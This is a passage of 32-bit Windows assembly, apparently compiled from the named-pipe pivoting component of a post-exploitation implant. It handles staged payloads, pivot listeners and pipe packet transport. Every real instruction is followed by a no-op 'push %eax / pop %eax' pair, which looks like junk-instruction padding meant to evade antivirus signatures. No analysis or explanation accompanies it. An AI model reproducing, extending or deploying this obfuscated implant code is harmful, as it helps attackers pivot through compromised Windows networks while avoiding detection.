	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	-24(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_named_pipe_write_raw
push %eax
pop %eax
	movl	$LC84, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	-52(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_free
push %eax
pop %eax
	movl	$LC85, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
L93:
	movl	-64(%ebp), %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	je	L97
push %eax
pop %eax
	movl	-64(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC86, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	-64(%ebp), %eax
push %eax
pop %eax
	movl	-24(%ebp), %edx
push %eax
pop %eax
	addl	$380, %edx
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	-24(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_read_pipe_to_packet
push %eax
pop %eax
L97:
	movl	$1, -16(%ebp)
push %eax
pop %eax
	jmp	L98
push %eax
pop %eax
L101:
	nop
push %eax
pop %eax
L98:
	movl	-24(%ebp), %eax
push %eax
pop %eax
	movl	16(%eax), %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	je	L99
push %eax
pop %eax
	movl	$LC87, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	-24(%ebp), %eax
push %eax
pop %eax
	movl	16(%eax), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__ResetEvent@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
L99:
	cmpl	$0, -16(%ebp)
push %eax
pop %eax
	je	L100
push %eax
pop %eax
	movl	-24(%ebp), %eax
push %eax
pop %eax
	movl	$0, 8(%eax)
push %eax
pop %eax
	movl	-24(%ebp), %eax
push %eax
pop %eax
	movl	$0, 12(%eax)
push %eax
pop %eax
	movl	$LC88, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	-24(%ebp), %edx
push %eax
pop %eax
	movl	-24(%ebp), %eax
push %eax
pop %eax
	leal	380(%eax), %ecx
push %eax
pop %eax
	movl	-24(%ebp), %eax
push %eax
pop %eax
	movl	368(%eax), %eax
push %eax
pop %eax
	movl	%edx, 16(%esp)
push %eax
pop %eax
	movl	$0, 12(%esp)
push %eax
pop %eax
	movl	$65536, 8(%esp)
push %eax
pop %eax
	movl	%ecx, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__ReadFile@20, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$20, %esp
push %eax
pop %eax
L100:
	movl	-12(%ebp), %eax
push %eax
pop %eax
L92:
	leave
push %eax
pop %eax
	ret
push %eax
pop %eax
	.section .rdata,"dr"
	.align 4
LC89:
	.ascii "[NP-SERVER] request_net_named_pipe_server_channel_open. response == NULL\0"
	.align 4
LC90:
	.ascii "[NP-SERVER] request_net_named_pipe_server_channel_open. ctx == NULL\0"
	.align 4
LC91:
	.ascii "[NP-SERVER] request_net_named_pipe_server_channel_open. namedPipeName == NULL\0"
	.align 4
LC92:
	.ascii "[NP-SERVER] request_net_named_pipe_server_channel_open. namedPipeName contains backslash (invalid)\0"
LC93:
	.ascii ".\0"
	.align 4
LC94:
	.ascii "[NP-SEVER] stage received, size is %u (%x)\0"
LC95:
	.ascii "\\\\%s\\pipe\\%s\0"
	.align 4
LC96:
	.ascii "[NP-SERVER] creation of the named pipe returned: %d 0x%x\0"
	.align 4
LC97:
	.ascii "[NP-SERVER] request_net_named_pipe_server_channel_open. named pipe server %s\0"
	.align 4
LC98:
	.ascii "[PIVOTTREE] Pivot listeners (after new one added)\0"
	.align 4
LC99:
	.ascii "[NP-SERVER] Error encountered %u 0x%x\0"
	.align 4
LC100:
	.ascii "[NP-SERVER] Destroying wait handle\0"
LC101:
	.ascii "[NP-SERVER] Destroying pipe\0"
	.text
	.globl	_request_core_pivot_add_named_pipe
	.def	_request_core_pivot_add_named_pipe;	.scl	2;	.type	32;	.endef
_request_core_pivot_add_named_pipe:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	subl	$88, %esp
push %eax
pop %eax
	movl	$0, -12(%ebp)
push %eax
pop %eax
	movl	$0, -16(%ebp)
push %eax
pop %eax
	movl	$0, -24(%ebp)
push %eax
pop %eax
	movl	$0, -28(%ebp)
push %eax
pop %eax
	movl	$0, -20(%ebp)
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_packet_create_response
push %eax
pop %eax
	movl	%eax, -24(%ebp)
push %eax
pop %eax
	cmpl	$0, -24(%ebp)
push %eax
pop %eax
	jne	L103
push %eax
pop %eax
	movl	$8, -12(%ebp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$LC89, 4(%esp)
push %eax
pop %eax
	movl	$LC31, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L112
push %eax
pop %eax
L103:
	movl	$65944, 4(%esp)
push %eax
pop %eax
	movl	$1, (%esp)
push %eax
pop %eax
	call	_calloc
push %eax
pop %eax
	movl	%eax, -16(%ebp)
push %eax
pop %eax
	cmpl	$0, -16(%ebp)
push %eax
pop %eax
	jne	L105
push %eax
pop %eax
	movl	$8, -12(%ebp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$LC90, 4(%esp)
push %eax
pop %eax
	movl	$LC31, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L112
push %eax
pop %eax
L105:
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	8(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 364(%eax)
push %eax
pop %eax
	call	_lock_create
push %eax
pop %eax
	movl	-16(%ebp), %edx
push %eax
pop %eax
	movl	%eax, 65940(%edx)
push %eax
pop %eax
	movl	$66189, 4(%esp)
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_packet_get_tlv_value_string
push %eax
pop %eax
	movl	%eax, -28(%ebp)
push %eax
pop %eax
	cmpl	$0, -28(%ebp)
push %eax
pop %eax
	jne	L106
push %eax
pop %eax
	movl	$87, -12(%ebp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$LC91, 4(%esp)
push %eax
pop %eax
	movl	$LC31, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L112
push %eax
pop %eax
L106:
	movl	$92, 4(%esp)
push %eax
pop %eax
	movl	-28(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_strchr
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	je	L107
push %eax
pop %eax
	movl	$87, -12(%ebp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$LC92, 4(%esp)
push %eax
pop %eax
	movl	$LC31, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L112
push %eax
pop %eax
L107:
	cmpl	$0, -20(%ebp)
push %eax
pop %eax
	jne	L108
push %eax
pop %eax
	movl	$LC93, -20(%ebp)
push %eax
pop %eax
L108:
	movl	$0, -44(%ebp)
push %eax
pop %eax
	leal	-44(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$262794, 4(%esp)
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_packet_get_tlv_value_raw
push %eax
pop %eax
	movl	%eax, -32(%ebp)
push %eax
pop %eax
	cmpl	$0, -32(%ebp)
push %eax
pop %eax
	je	L109
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	leal	296(%eax), %edx
push %eax
pop %eax
	movl	$16, 8(%esp)
push %eax
pop %eax
	movl	-32(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	%edx, (%esp)
push %eax
pop %eax
	call	_memcpy
push %eax
pop %eax
L109:
	movl	-16(%ebp), %eax
push %eax
pop %eax
	addl	$65936, %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$262795, 4(%esp)
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_packet_get_tlv_value_raw
push %eax
pop %eax
	movl	%eax, -36(%ebp)
push %eax
pop %eax
	cmpl	$0, -36(%ebp)
push %eax
pop %eax
	je	L110
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	65936(%eax), %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	je	L110
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	65936(%eax), %edx
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	65936(%eax), %eax
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC94, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	65936(%eax), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_malloc
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	%edx, 65932(%eax)
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	65936(%eax), %edx
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	65932(%eax), %eax
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	movl	-36(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_memcpy
push %eax
pop %eax
L110:
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	$-1, 368(%eax)
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	leal	40(%eax), %edx
push %eax
pop %eax
	movl	-28(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 20(%esp)
push %eax
pop %eax
	movl	-20(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 16(%esp)
push %eax
pop %eax
	movl	$LC95, 12(%esp)
push %eax
pop %eax
	movl	$255, 8(%esp)
push %eax
pop %eax
	movl	$256, 4(%esp)
push %eax
pop %eax
	movl	%edx, (%esp)
push %eax
pop %eax
	movl	__imp___snprintf_s, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_create_pipe_server_instance
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC96, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	cmpl	$0, -12(%ebp)
push %eax
pop %eax
	jne	L112
push %eax
pop %eax
	movl	-28(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC97, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	$12, 4(%esp)
push %eax
pop %eax
	movl	$1, (%esp)
push %eax
pop %eax
	call	_calloc
push %eax
pop %eax
	movl	%eax, -40(%ebp)
push %eax
pop %eax
	movl	-40(%ebp), %eax
push %eax
pop %eax
	movl	-16(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 8(%eax)
push %eax
pop %eax
	movl	-40(%ebp), %eax
push %eax
pop %eax
	movl	$_remove_listener, 4(%eax)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	84(%eax), %eax
push %eax
pop %eax
	movl	-40(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	movl	-32(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_pivot_tree_add
push %eax
pop %eax
	movl	$LC98, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	84(%eax), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_dbgprint_pivot_tree
push %eax
pop %eax
L112:
	movl	-24(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_packet_transmit_response
push %eax
pop %eax
	cmpl	$0, -12(%ebp)
push %eax
pop %eax
	je	L120
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC99, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	cmpl	$0, -16(%ebp)
push %eax
pop %eax
	je	L121
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	65940(%eax), %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	je	L116
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	65940(%eax), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_lock_destroy
push %eax
pop %eax
L116:
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	16(%eax), %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	je	L117
push %eax
pop %eax
	movl	$LC100, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	16(%eax), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__CloseHandle@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
L117:
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	368(%eax), %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	je	L118
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	368(%eax), %eax
push %eax
pop %eax
	cmpl	$-1, %eax
push %eax
pop %eax
	je	L118
push %eax
pop %eax
	movl	$LC101, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	368(%eax), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__CloseHandle@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
L118:
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_free
push %eax
pop %eax
	jmp	L114
push %eax
pop %eax
L120:
	nop
push %eax
pop %eax
	jmp	L114
push %eax
pop %eax
L121:
	nop
push %eax
pop %eax
L114:
	movl	-12(%ebp), %eax
push %eax
pop %eax
	leave
push %eax
pop %eax
	ret
push %eax
pop %eax
.lcomm _attempted.83832,4,4
.lcomm _pAddMandatoryAce.83833,4,4
	.ident	"GCC: (GNU) 9.3-win32 20200320"
	.def	_strlen;	.scl	2;	.type	32;	.endef
	.def	_vsnprintf_s;	.scl	2;	.type	32;	.endef
	.def	_lock_acquire;	.scl	2;	.type	32;	.endef
	.def	_free;	.scl	2;	.type	32;	.endef
	.def	_lock_destroy;	.scl	2;	.type	32;	.endef
	.def	_lock_release;	.scl	2;	.type	32;	.endef
	.def	_scheduler_signal_waitable;	.scl	2;	.type	32;	.endef
	.def	_realloc;	.scl	2;	.type	32;	.endef
	.def	_memcpy;	.scl	2;	.type	32;	.endef
	.def	_xor_bytes;	.scl	2;	.type	32;	.endef
	.def	_calloc;	.scl	2;	.type	32;	.endef
	.def	_packet_get_tlv_value_string;	.scl	2;	.type	32;	.endef
	.def	_memcmp;	.scl	2;	.type	32;	.endef
	.def	_packet_get_tlv_value_raw;	.scl	2;	.type	32;	.endef
	.def	_pivot_tree_remove;	.scl	2;	.type	32;	.endef
	.def	_pivot_tree_add;	.scl	2;	.type	32;	.endef
	.def	_dbgprint_pivot_tree;	.scl	2;	.type	32;	.endef
	.def	_packet_create;	.scl	2;	.type	32;	.endef
	.def	_packet_add_tlv_raw;	.scl	2;	.type	32;	.endef
	.def	_packet_transmit;	.scl	2;	.type	32;	.endef
	.def	_memmove;	.scl	2;	.type	32;	.endef
	.def	_scheduler_insert_waitable;	.scl	2;	.type	32;	.endef
	.def	_lock_create;	.scl	2;	.type	32;	.endef
	.def	_pivot_tree_find;	.scl	2;	.type	32;	.endef
	.def	_packet_add_request_id;	.scl	2;	.type	32;	.endef
	.def	_malloc;	.scl	2;	.type	32;	.endef
	.def	_rand_xor_key;	.scl	2;	.type	32;	.endef
	.def	_packet_create_response;	.scl	2;	.type	32;	.endef
	.def	_strchr;	.scl	2;	.type	32;	.endef
	.def	_packet_transmit_response;	.scl	2;	.type	32;	.endef
